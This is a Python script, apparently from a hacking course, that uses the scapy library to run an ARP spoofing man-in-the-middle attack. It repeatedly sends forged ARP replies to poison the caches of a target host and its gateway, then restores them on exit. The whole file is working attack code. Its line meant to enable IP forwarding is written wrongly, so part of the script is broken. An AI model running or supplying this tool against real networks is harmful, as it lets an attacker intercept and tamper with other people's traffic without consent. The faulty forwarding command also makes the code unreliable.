#!/usr/bin/python3
import scapy.all as scapy
import time
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target")
    parser.add_argument("-g", "--get_way", dest="get_way")
    options = parser.parse_args()
    return options


def get_mac(ip):
    try:
        arp_requests = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_requests_broadcast = broadcast / arp_requests
        answered = scapy.srp(arp_requests_broadcast, verbose=False, timeout=1)[0]
        return answered[0][1].hwsrc
    except IndexError:
        pass
    

def arpspoof(target_ip, router):
    subprocess.call("echo > 1 /proc/sys/net/ipv4/ip_forward", shell=True)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router)
    scapy.send(packet, verbose=False)


def restore(target_ip, router):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router, hwsrc=router_mac)
    scapy.send(packet, verbose=False, count=6)


try:
    packet_sent = 0
    while True:
        options = get_arguments()
        arpspoof(options.target, options.get_way)
        arpspoof(options.get_way, options.target)
        packet_sent += 2
        print(f"\r[+] Packet Sent: [ {packet_sent} ]", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] CTRL-C Detected. Restoring arp Tables.\n[+] Quitting.")
    options = get_arguments()
    restore(options.target, options.get_way)
    restore(options.get_way, options.target)
